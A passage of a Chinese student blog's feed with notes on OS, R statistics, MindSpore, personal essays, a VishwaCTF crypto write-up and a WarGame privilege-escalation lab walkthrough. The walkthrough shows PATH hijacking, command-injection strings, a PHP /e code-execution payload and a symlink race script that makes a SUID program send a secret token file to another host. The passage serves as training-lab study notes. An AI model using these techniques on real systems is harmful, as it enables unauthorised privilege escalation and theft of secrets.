class="keyword">case</span> <span class="number">0</span>: <span class="keyword">if</span> (f-&gt;n == <span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;%c -&gt; %c\n&quot;</span>, f-&gt;from, f-&gt;to), f-&gt;pc = <span class="number">3</span>; <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>: call(f-&gt;n - <span class="number">1</span>, f-&gt;from, f-&gt;via, f-&gt;to);   <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>: call(       <span class="number">1</span>, f-&gt;from, f-&gt;to,  f-&gt;via);  <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>: call(f-&gt;n - <span class="number">1</span>, f-&gt;via,  f-&gt;to,  f-&gt;from); <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>: ret();                                    <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>: panic();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>二进制程序是状态机</h1><ul><li>状态 = 内存  + 寄存器</li><li>初始状态 = (稍后回答)</li><li>迁移 = 执行一条指令</li></ul><h2 id="操作系统上的程序"><a class="header-anchor" href="#操作系统上的程序">¶</a>操作系统上的程序</h2><p><strong>所有的指令都只能计算</strong></p><ul><li>deterministic: mov, add, sub, call, …</li><li>non-deterministic: rdrand, …</li><li>但这些指令甚至都无法使程序停下来</li></ul><h2 id="特殊指令：syscall"><a class="header-anchor" href="#特殊指令：syscall">¶</a>特殊指令：syscall</h2><ul><li><p>把内存M、寄存器R完全交给操作系统，任其修改</p></li><li><p>实现与操作系统中的其他对象交互</p><ul><li>读写文件/操作系统状态 (例如把文件内容写入M )</li><li>改变进程 (运行中状态机) 的状态，例如创建进程/销毁自己</li></ul></li></ul><h2 id="程序-计算-syscall"><a class="header-anchor" href="#程序-计算-syscall">¶</a>程序 = 计算 + syscall</h2><h1>在程序的两个视角之间切换</h1><p>“状态机” 顺便解决了一个非常重要的基本问题：什么是编译器？</p><p>编译器：源代码S (状态机) → 二进制代码C (状态机)</p><p>编译 (优化) 的正确性 (Soundness):</p><ul><li>S与C的可观测行为严格一致<ul><li>system calls; volatile variable loads/stores; termination</li></ul></li><li>Trivially 正确 (但低效) 的实现<ul><li>解释执行/直接翻译S的语义</li></ul></li></ul><h1>操作系统中的一般程序</h1><p>操作系统收编了所有的硬件/软件资源</p><ul><li>只能用操作系统允许的方式访问操作系统中的对象<ul><li>从而实现操作系统的 “霸主” 地位</li></ul></li><li>这是为 “管理多个状态机” 所必须的<ul><li>不能打架，谁有权限就给他</li></ul></li></ul><h2 id="二进制程序状态机的初始-结束状态"><a class="header-anchor" href="#二进制程序状态机的初始-结束状态">¶</a>二进制程序状态机的初始/结束状态</h2><ul><li><code>main()</code> 的开始/结束并不是整个程序的开始/结束</li></ul><p>gdb <code>info proc &#123;mappings,...&#125;</code> - 打印进程内存</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>R语言笔记</title>
      <link href="/2022/07/23/R%E8%AF%AD%E8%A8%80%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/07/23/R%E8%AF%AD%E8%A8%80%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="五数概括"><a class="header-anchor" href="#五数概括">¶</a>五数概括</h2><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">summary(data$A)<span class="comment"># 五数</span></span><br><span class="line"></span><br><span class="line">mean(data$A) <span class="comment"># 均值</span></span><br><span class="line"></span><br><span class="line">median(data$A) <span class="comment">#中位数</span></span><br><span class="line"></span><br><span class="line">var(data$A) <span class="comment"># 方差</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 众数没有标准内置</span></span><br><span class="line">getmode &lt;- <span class="keyword">function</span>(v) &#123;</span><br><span class="line">  uniqv &lt;- unique(v)</span><br><span class="line">  uniqv[which.max(tabulate(match(v, uniqv)))]</span><br><span class="line">&#125;</span><br><span class="line">mode &lt;- getmode(mtcars$drat)</span><br></pre></td></tr></table></figure><h2 id="ggplot绘图"><a class="header-anchor" href="#ggplot绘图">¶</a>ggplot绘图</h2><h3 id="几何对象"><a class="header-anchor" href="#几何对象">¶</a>几何对象</h3><p>geom_bar: 柱状图，饼图</p><p>geom_boxplot: 箱型图</p><p>geom_histogram: 直方图</p><p>geom_freqpoly: 频线图</p><p>geom_density: 密度函数平滑估计图</p><p>geom_point: 散点图</p><p>geom_path/geom_line: 线图(数据出现顺序/横坐标大小)</p><p>geom_smooth: 平滑曲线拟合图</p><p>geom_contour:  等高线</p><h3 id="分面"><a class="header-anchor" href="#分面">¶</a>分面</h3><p>按类别变量的值分组，将绘图窗口划分成若干个子窗口，绘制没一个状态下的图</p><p>facet_wrap(<s>变量)，facet_wrap(变量1</s>变量2)</p><p>facet_wrap(~变量，nrow=行数, ncol=列数)</p><p>基本语法</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ggplot(data, aes(x=variable,y=variable, size/fill/color=variable))</span></span><br><span class="line"><span class="comment"># + geom_bar/histogram/…(color=, size=, fill=, shape=)</span></span><br><span class="line"><span class="comment"># + facet_warp(~变量，ncol=,nrow=) +labs(x=,y=,title=)</span></span><br><span class="line"></span><br><span class="line">ggplot(data = table,aes(x = 身高,y = 体重))+geom_point()</span><br></pre></td></tr></table></figure><h2 id="假设检验"><a class="header-anchor" href="#假设检验">¶</a>假设检验</h2><h3 id="点估计：求解方程"><a class="header-anchor" href="#点估计：求解方程">¶</a>点估计：求解方程</h3><ol><li>install.packages(‘rootSolve’) # 安装rootSolve程序包</li><li>library(rootSolve) # 载⼊包</li><li>用rootSolve包中的函数multiroot()求解方程组；</li></ol><p>例（均匀分布参数的矩估计）：X 服从[θ1, θ2]的均匀分布，现有10个样本：4, 5, 2, 9, 5, 1, 6, 4, 6, 2，估计参数θ1、θ2；</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">install.packages(<span class="string">&#x27;rootSolve’); library(rootSolve);</span></span><br><span class="line"><span class="string">x=c(4, 5, 2, 9, 5, 1, 6, 4, 6, 2);</span></span><br><span class="line"><span class="string">mu=mean(x);</span></span><br><span class="line"><span class="string">var=sum((x-mean(x))^2)/10;</span></span><br><span class="line"><span class="string">model = function(theta, mu, var)&#123;</span></span><br><span class="line"><span class="string">    c(F1 = theta[1] + theta[2] - 2 * mu, F2= (theta[2] - theta[1]) ^ 2 / 12 - var)</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">multiroot (f=model, start=c(0,10), mu=mu, var=var)</span></span><br></pre></td></tr></table></figure><h2 id="假设检验-v2"><a class="header-anchor" href="#假设检验-v2">¶</a>假设检验</h2><p>正态总体均值的假设检验：</p><ul><li><p>方差已知：z.test();</p></li><li><p>方差未知：t.test();</p></li><li><p>正态总体方差假设检验：var.test();</p></li></ul><p>➢    例（单个正态总体方差未知）：t.test(x, alternative = “less”, mu=103.5, sigma.x = Null, conf.level=0.95)</p><p>参数解释如下：<br>•    alternative用于指定备择假设的形式，默认为双边假设检验， less表示左边假设检验，greater表示右边假设检验；<br>•    mu表示均值，默认为0；<br>•    sigma.x指定样本标准差；<br>•    conf.level指定的1-𝛼，默认为1-0.05；</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> R </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vishwa CTF记录</title>
      <link href="/2022/04/03/Vishwa%20CTF%E8%AE%B0%E5%BD%95/"/>
      <url>/2022/04/03/Vishwa%20CTF%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1>Vishwa CTF记录</h1><h2 id="Cryptography"><a class="header-anchor" href="#Cryptography">¶</a>Cryptography</h2><h3 id="1-John-The-Rocker"><a class="header-anchor" href="#1-John-The-Rocker">¶</a>1. John The Rocker</h3><p>无题目描述，<a href="https://github.com/StantonJoY/CTF-Notes/blob/main/VishwaCTF-22/idrsa.id_rsa.docx">idrsa.id_rsa</a></p><p>思路：</p><ol><li>先将<code>id_rsa</code>文件转为hash</li><li>根据题目提示使用john the ripper爆破</li></ol><p><img src="https://s2.loli.net/2022/05/03/dpr9NulbKsz8eW5.png" alt="image-20220403014053311"></p><h3 id="2-Tallest-Header"><a class="header-anchor" href="#2-Tallest-Header">¶</a>2. Tallest Header</h3><p>My friend sent me file and said how amazing this is, but i think while sending file corrupted. Can you help me fixing this? PS: make it lowercase<br><a href="https://github.com/StantonJoY/CTF-Notes/blob/main/VishwaCTF-22/file.extension">file.extension</a></p><p>蛮经典的隐写题，用010Editor打开，不难猜到是一张jpg图片，将开头的HEX码改为jpg的格式标识，即可打开。</p><p><img src="https://s2.loli.net/2022/05/03/Ogi8w3XMIVPzREQ.jpg" alt></p><p><code>unzip file.jpg</code>把他分离，果然得到一些文件，得到加密方式以及密文，编写解码脚本也很容易：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># decrypt.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_key</span>(<span class="params">key</span>):</span></span><br><span class="line">    inverse = []</span><br><span class="line">    <span class="keyword">for</span> position <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">min</span>(key),<span class="built_in">max</span>(key)+<span class="number">1</span>,<span class="number">1</span>):</span><br><span class="line">        inverse.append(key.index(position)+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> inverse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">key, ciphertext</span>):</span></span><br><span class="line">    <span class="keyword">return</span> encrypt(inverse_key(key), ciphertext)</span><br><span class="line"><span class="built_in">print</span>(decrypt(key, ciphertext)</span><br><span class="line"><span class="comment"># 得到flag vishwaCTF&#123;tr1cky_h34d3r_w1th_p3rmu7at10n&#125;</span></span><br></pre></td></tr></table></figure><h3 id="3-Jumble-Bumble"><a class="header-anchor" href="#3-Jumble-Bumble">¶</a>3. Jumble Bumble</h3><p>Jumble Bumble been encode, get the flag from the code<br><a href="https://github.com/StantonJoY/CTF-Notes/blob/main/VishwaCTF-22/JumbleBumble.txt">JumbleBumble.txt</a><br><a href="https://github.com/StantonJoY/CTF-Notes/blob/main/VishwaCTF-22/script.py">script.py</a></p><p>暴力</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> integer_nthroot</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    n = <span class="built_in">int</span>(file.readline().strip())</span><br><span class="line">    c = <span class="built_in">int</span>(file.readline().strip())</span><br><span class="line">    dis = file.readline()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        ans = integer_nthroot(c, <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">if</span> ans[<span class="number">1</span>]:</span><br><span class="line">            m = ans[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    plaintext = long_to_bytes(m).decode()</span><br><span class="line">    <span class="built_in">print</span>(plaintext)</span><br></pre></td></tr></table></figure><h3 id="4-Musical-Notes"><a class="header-anchor" href="#4-Musical-Notes">¶</a>4. Musical Notes</h3><p>Once I opened music website and found this image. There was SEA of images but this one seemed different.<br>There was written under this image that : listentocoolsong<br><a href="https://github.com/StantonJoY/CTF-Notes/blob/main/VishwaCTF-22/image.png">image.png</a><br>Hint: All Chores Encloses Rare Encryption cipher</p><p>![image](image/Vishwa CTF记录/image.png)</p><p>这题实在没有思路，没见过的加密方法，</p><p>解码后：<code>5F6E8ACADC725F3515B9A302FE04FF3DF97D7F08A3BB6ABC4C168E0E14D5044F</code></p><p>题目中SEA暗示AES，secret key 为listentocoolsong……这题实在脑洞，Flag: vishwaCTF{mus1c4l_c1ph3r_1n_4ct10n}</p><h3 id="5"><a class="header-anchor" href="#5">¶</a>5.</h3>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cyber Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>像我这样的人</title>
      <link href="/2022/02/08/%E5%83%8F%E6%88%91%E8%BF%99%E6%A0%B7%E7%9A%84%E4%BA%BA/"/>
      <url>/2022/02/08/%E5%83%8F%E6%88%91%E8%BF%99%E6%A0%B7%E7%9A%84%E4%BA%BA/</url>
      
        <content type="html"><![CDATA[<p>夜晚，终于得以从忙碌的一天脱身。<br>结束了一天的行程，终于将步调放缓了些。<br>一个人的时间，有时并不孤单。<br>一整天的没了自我过后，此刻你才真正拥有自己。<br>偶尔……或是经常，你回朔今日的一举一动，回顾这一周、一个月、一年。一生。<br>你不明所以，为何事情的发展是如此，为何当初的选择是那样，又为何现在的你，是这样。</p><p>《像我这样的人》毛不易，当代音乐不多的我听得入耳的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">像我这样优秀的人</span><br><span class="line">本该灿烂过一生</span><br><span class="line">怎麼二十多年到头来</span><br><span class="line">还在人海裡浮沉</span><br><span class="line"></span><br><span class="line">像我这样聪明的人</span><br><span class="line">早就告别了单纯</span><br><span class="line">怎麼还是用了一段情</span><br><span class="line">去换一身伤痕</span><br><span class="line"></span><br><span class="line">像我这样迷茫的人</span><br><span class="line">像我这样寻找的人</span><br><span class="line">像我这样碌碌无為的人</span><br><span class="line">你还见过多少人</span><br><span class="line"></span><br><span class="line">像我这样庸俗的人</span><br><span class="line">从不喜欢装深沉</span><br><span class="line">怎麼偶尔听到老歌时</span><br><span class="line">忽然也晃了神</span><br><span class="line">像我这样懦弱的人</span><br><span class="line">凡事都要留几分</span><br><span class="line">怎麼曾经也会為了谁</span><br><span class="line">想过奋不顾身</span><br><span class="line"></span><br><span class="line">像我这样迷茫的人</span><br><span class="line">像我这样寻找的人</span><br><span class="line">像我这样碌碌无為的人</span><br><span class="line">你还见过多少人</span><br><span class="line"></span><br><span class="line">像我这样孤单的人</span><br><span class="line">像我这样傻的人</span><br><span class="line">像我这样不甘平凡的人</span><br><span class="line">世界上有多少人</span><br><span class="line"></span><br><span class="line">像我这样迷茫的人</span><br><span class="line">像我这样寻找的人</span><br><span class="line">像我这样碌碌无為的人</span><br><span class="line">你还见过多少人</span><br><span class="line"></span><br><span class="line">像我这样孤单的人</span><br><span class="line">像我这样傻的人</span><br><span class="line">像我这样不甘平凡的人</span><br><span class="line">世界上有多少人</span><br><span class="line"></span><br><span class="line">像我这样莫名其妙的人</span><br><span class="line">会不会有人心疼</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>某个时期，生活紧绷，无法停止的脚步，停下便焦虑的心律。<br>那时的我，时常会听这首歌。<br>它缓解了我的压力，无法完美处理的情绪。<br>将我的手足无措释放，安置在它该存在的地方。<br>它用悲伤，抚平了我的伤悲。</p><p>当奋力过后，迎来的却是空虚。<br>当奔跑的过程，却听见许多不安与质疑。<br>而那些质疑，不是爱碎嘴的路人，不是一知半解的友人，不是固执己见的亲人。</p><p>是你，是你自己本人。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MindSpore</title>
      <link href="/2022/01/25/MindSpore/"/>
      <url>/2022/01/25/MindSpore/</url>
      
        <content type="html"><![CDATA[<h1>MindSpore Winter Camp</h1><p>华为寒假MindSpore实践课，作为听课的为数不多的大二同学，12h速成DNN…听起来蛮吓人的</p><p>华为讲的还是可以的，老师准备很充分，资源配备也很好，云服务器体验实在太顶了，那模型我本机十几天都不一定训练的出来</p><p>资料都整理在<a href="https://github.com/StantonJoY/NJU-SE-Notes/tree/main/WinterSchool%20DNN">仓库</a></p><p>一点点文档没有的知识记录：</p><ul><li><p>特征图大小：(n+2p-f)/s +1向下取整</p><p>n：边长</p><p>p：填充（padding）</p><p>f：filter边长</p><p>s：步长（stride）</p><p>因此代码中全连接时数据都是经过上述公式计算的，不是随便填的</p></li><li><p><code>net_loss = nn.SoftmaxCrossEntropyWithLogits(sparse=True, reduction='mean')</code></p><p>sparse指不对数据进行<a href="https://zhuanlan.zhihu.com/p/37471802">One-Hot编码</a></p><p>标签编码的问题是它假定类别值越高，该类别更好，对于编号1、2、3，会有1 + 3 = 4，4 / 2 = 2，将类别之间建立起错误地关联</p></li></ul><p>完成那些任务居然还给发了个证书，小开心~</p><p><img src="https://s2.loli.net/2022/05/03/2ZyqmeDkiXKIFHN.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>COA</title>
      <link href="/2022/01/25/COA%E4%B8%8A%E6%9C%BA%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/01/25/COA%E4%B8%8A%E6%9C%BA%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>复习折磨的COA上机考试整理的流程图，删去可惜，留与有缘人</p><p><img src="https://s2.loli.net/2022/05/03/7ZsmHSqyJwTp9rI.png" alt="Transformer"></p><p><img src="https://s2.loli.net/2022/05/03/yeXNRzb6Tf7OBtQ.png" alt="ALU"></p><p><img src="https://s2.loli.net/2022/05/03/A1r9toHin2bOxgj.png" alt="FPU"></p><p><img src="https://s2.loli.net/2022/05/03/PvuWEgdL9AenhYK.png" alt="NBCD"></p><p><img src="https://s2.loli.net/2022/05/03/m3ZbJYvrzK6MacH.png" alt="MMU"></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随笔</title>
      <link href="/2021/12/17/21.12.11%E9%9A%8F%E7%AC%94/"/>
      <url>/2021/12/17/21.12.11%E9%9A%8F%E7%AC%94/</url>
      
        <content type="html"><![CDATA[<p>十二月初冬的天气，傍晚五六点的光景，正是云霞最好看的时候，夕阳遥遥悬在天边，飘着几朵碎云，被染成金红金红的，金得璀璨夺目，红得明艳动人</p><p>但这是一种，没有意义的美</p><p>没有意义在哪？</p><p>没有意义在，我既没有值得分享的人，也不想驻足拍下来把这一刻留住</p><p>学会把这些片刻写下来，而不是再去试图告诉谁</p><p>今天的晚霞很美，虽然它跟昨天前天，明天后天，或者无数个以前以后并没有什么不同</p><p>它一点都不特别</p><p>只是我吹着晚风，迎着人潮汹涌，走在街上，转头看向那晚霞的时候</p><p>感到莫名的萧索</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WarGame闯关笔记</title>
      <link href="/2021/12/17/WarGame/"/>
      <url>/2021/12/17/WarGame/</url>
      
        <content type="html"><![CDATA[<h1>WarGame简介</h1><p><a href="https://box.nju.edu.cn/d/10484f123139461d9412/">虚拟机及题目链接</a></p><p>WarGame提供的虚拟机镜像是一个基于 Linux 的漏洞挖掘的练习闯关平台。闯关者需要从中找到漏洞并突破权限。相信在完成该平台的练习后，你将对漏洞挖掘的原理有一个较为透彻的理解，并掌握漏洞挖掘的基本方法。</p><p>该平台的每一个关卡对应一个名为 levelXX 的账号，密码与账号名相同。在完成每一关 的 题 目 之 前 ， 你 需 要 用 对 应 的 账 号 登 录 系 统 。 每 个 关 卡 的 题 目 对 应 的 文 件 都 放 在 /home/flagXX 目录中。例如，第一关的账号名是 level01，密码也是 level01，如果这个关卡 有需要攻击的包含漏洞的程序，那么相应的程序就放在/home/flag01 目录中。每个关卡的内 容介绍和相关程序的源代码可以在本实验讲义后面对应的 Level 小节中获得。<br>/home/flagXX 目录中的程序具备 SUID 权限。例如在关卡 level01 中，用 level01 账号登 录进系统，然后执行/home/flag01/flag01，程序将以 flag01 的身份运行。当你利用该程序的 漏洞提升自己的权限后，你的身份就将变为 flag01。提权成功后，你需要执行/bin/getflagXX 程序（对本例来说，就是执行/bin/getflag01），如果你确实是以 flagXX 的身份运行该程序， 就将获得提示：“Congratulation! The flag is xxx-xxx”，否则获得的提示为：“Wrong, You are in  a  non-flag  account”。每个关卡的最终目的就是利用程序漏洞提升自己的权限，然后想办 法执行/bin/getflagXX 程序并获得 flag。</p><h1>Level00</h1><p>查找具有SUID权限的程序，找到 /bin/…/flag00: find / -perm /4000</p><p>PS：老师是不是发虚拟机之前调用了flag00，历史指令按两下就出现了flag00，不过这大概不能算是另一种做法吧~</p><p><img src="https://s2.loli.net/2021/12/17/8OpRzalEdNQXHcm.png" alt="00"></p><h1>Level01</h1><ol><li>在用户目录下创建符号链接echo, 链接到getflag: ln -s /bin/getflag01 ~/echo</li><li>将自己的用户目录添加到环境变量中: export PATH=/home/level01/:$PATH</li><li>执行flag01, 它会帮我们运行 /bin/getflag01</li></ol><p><img src="https://s2.loli.net/2021/12/17/sV9kgcCtlev1Eox.png" alt="01"></p><h1>Level02</h1><ol><li>修改用户名, 使其闭合前一个语句并在后面执行getflag: export USER=“name &amp;&amp; /bin/getflag02 &amp;&amp;”</li><li>执行flag02</li></ol><p><img src="https://s2.loli.net/2021/12/17/eiB3xrV5taovC4M.png" alt="02"></p><h1>Level03</h1><ol><li>在用户目录下写一个getflag( /bin/getflag03 &gt; ~/flag), 将它拷贝到漏洞目录下</li><li>等待一会crontab执行, 查看获得flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/XxwEAyrfPTRWchu.png" alt="03"></p><h1>Level04</h1><ol><li>在用户目录下创建链接至/home/flag04/token</li><li>执行flag04, 查看token</li><li>切换到用户flag04, 执行/bin/getflag04</li></ol><p><img src="https://s2.loli.net/2021/12/17/43lnuvaASCTp7mK.png" alt="04"></p><h1>Level05</h1><ol><li>将压缩包解压到用户目录下: tar zxvf backup-2017.tar.gz -C ~/</li><li>使用ssh密钥登录flag05: ssh -i .ssh/id_rsa <a href="mailto:flag05@192.168.195.128">flag05@192.168.195.128</a></li><li>运行/bin/flag05获得flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/5zaHnPuKIGVdlhJ.png" alt="05"></p><h1>Level06</h1><ol><li>查看/etc/passwd, 发现flag06密码的密文存在了这里</li><li>使用kali的john插件进行破解, 得到flag06的密码 ftc</li><li>登录用户flag06, 运行/bin/getflag06</li></ol><p><img src="https://s2.loli.net/2021/12/17/JIARGCDTc7Y5kKg.png" alt="06"></p><h1>Level07</h1><ol><li>index.cgi监听端口8888, CGI采用get方法响应请求, 该程序传输 Host参数</li><li>构造语句闭合ping命令( ||/bin/getflag07)</li></ol><p><img src="https://s2.loli.net/2021/12/17/2Xz7KtonCUbvw1O.png" alt="07"></p><h1>Level08</h1><ol><li>使用nc将capture.pcap传到kali:<ul><li>靶机 nc -lp 4455 &lt; capture.pcap -q 1</li><li>攻击机 nc -nv 192.168.1.233 4455 &gt; cap.pcap</li></ul></li><li>使用Wireshark进行分析, 追踪TCP流, 得到Password: backd00Rmate</li><li>登录flag08, 执行/bin/getflag08得到flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/irc9RutBzyMflPw.png" alt="08"></p><h1>Level09</h1><ol><li><p>注意到代码</p><p><code>$contents = preg_replace(&quot;/(\[email (.*)\])/e&quot;, &quot;spam(\&quot;\\2\&quot;)&quot;, $contents);</code></p><p>preg_replace第一参数使用了**/e模式**，preg_replace的第二个参数会作为代码执行。</p></li><li><p>用php中的system函数执行外部的shell命令，将<code>[email &quot;&#123;$&#123;system(getflag)&#125;&#125;&quot;]</code>写入/tmp/atk</p></li><li><p>./flag19 /tmp/atk 获得flag</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/xtDB1MIp5dhWG6j.png" alt="09"></p><h1>Level10</h1><ol><li><p>flag10程序判断用户是否拥有读该文件的权限, 如果有, 通过18888端口发送给指定host</p></li><li><p>kali机永久监听18888端口, 并将内容输出到log: ncat -lp 18888 -k &gt;&gt; log</p></li><li><p><a href="http://xn--switch-of8i52at7oc26duqa348pbqlt0g.sh">编写条件竞争脚本switch.sh</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line"> ln -s /home/level10/null /home/level10/fake</span><br><span class="line"> unlink /home/level10/fake</span><br><span class="line"> ln -s /home/flag10/token /home/level10/fake</span><br><span class="line"> unlink /home/level10/fake</span><br><span class="line">done</span><br></pre></td></tr></table></figure></li><li><p><a href="http://xn--start-by5hv20kj82bz1djuwxpt.sh">编写运行脚本start.sh</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">/home/flag10/flag10 /home/level10/fake 192.168.1.114</span><br><span class="line">done</span><br></pre></td></tr></table></figure></li><li><p><a href="http://xn--1switch-hc5k0ou4pznijkao938bxh2attx.sh">以1优先级后台运行switch.sh</a>, <a href="http://xn--19start-hc5k1ou4ppz9lsgyavou.sh">以19优先级运行start.sh</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nice -n1 sh switch.sh &amp;</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nice -n19 sh start.sh</span></span><br></pre></td></tr></table></figure></li><li><p>在kali机查看log, 得到token( b3c5-6d82-7sfc), 登录flag10, 获得flag</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/cPBrLyX13I879Vw.png" alt="10"></p><h1>Level12</h1><ol><li>连接50000端口的lua服务： nc -nv 127.0.0.1 50000</li><li>输入指令闭合语句，获得flag： ; /bin/getflag12 &gt; ~/flag; #</li></ol><p><img src="https://s2.loli.net/2021/12/17/f87u1qP3BDGRkSA.png" alt="12"></p><h1>Level13</h1><ol><li>使用gdb调试程序： gdb ./flag13</li><li>在main中打断点： (gdb) b main</li><li>(gdb) display /20i $pc，查看20行汇编</li><li>运行，然后单步调试到 ”=&gt; 0x080484f4 &lt;+48&gt;:    cmp eax, 0x3e8“</li><li>修改寄存器eax的值为0x3e8： (gdb) set $eax=0x3e8</li><li>继续执行得到token（b705702b-76a8-42b0-8844-3adabbe5ac58），登录flag13获得flag</li></ol><p><img 